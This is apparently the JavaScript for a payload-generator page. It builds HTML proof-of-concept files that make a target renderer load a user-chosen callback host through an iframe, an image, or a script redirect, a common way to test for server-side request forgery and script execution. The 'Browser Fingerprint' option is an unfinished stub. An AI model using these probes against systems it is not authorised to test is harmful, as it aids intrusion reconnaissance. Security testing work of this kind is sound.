var callbackHost = document.getElementById("callback-host");
var submitButton = document.getElementById("submit");
var payloadOutput = document.getElementById("payload-output");
var selectedPayload = document.getElementById("select-payload");
var copyPayloadButton = document.getElementById("copy-payload");

function handleSubmit () {
    var userHost = callbackHost.value;
    var payloadType = selectedPayload.value;
    var iframeOutput = document.getElementById("payload-output");
    var imageOutput = document.getElementById("payload-output");
    var jsexecOutput = document.getElementById("payload-output");
    var fingerprintOutput = document.getElementById("payload-output");
    if (payloadType == "Load iframes") {
        iframeOutput.value = `
<html>
<h1>Iframe Render Test</h1>
<body>
<iframe src="${userHost}">
</body>
</html>`;
    } else if (payloadType == 'Load Images') {
        imageOutput.value = `
<html>
<h1>Image Render Test</h1>
<body>
<img src="${userHost}">
</body>
</html>`;
    } else if (payloadType == 'Test JS Execution') {
        jsexecOutput.value = `
<html>
<h1> JS Execution Test </h1>
<body>
<script>
window.location.replace("${userHost}/scripted");
</script>
</body>
</html>`;
    } else if (payloadType == 'Browser Fingerprint') {
        fingerprintOutput = `
N/A
`
    }
}

submitButton.addEventListener('click', handleSubmit);

function copyToClipboard() {
    var pocOutputToCopy = document.getElementById("payload-output").value;
    navigator.clipboard.writeText(pocOutputToCopy)
     .then(()=> {
        alert("PoC Copied!");
     })
     .catch(err => {
        console.error("Failed to copy: ", err);
     });
}

copyPayloadButton.addEventListener('click', copyToClipboard);
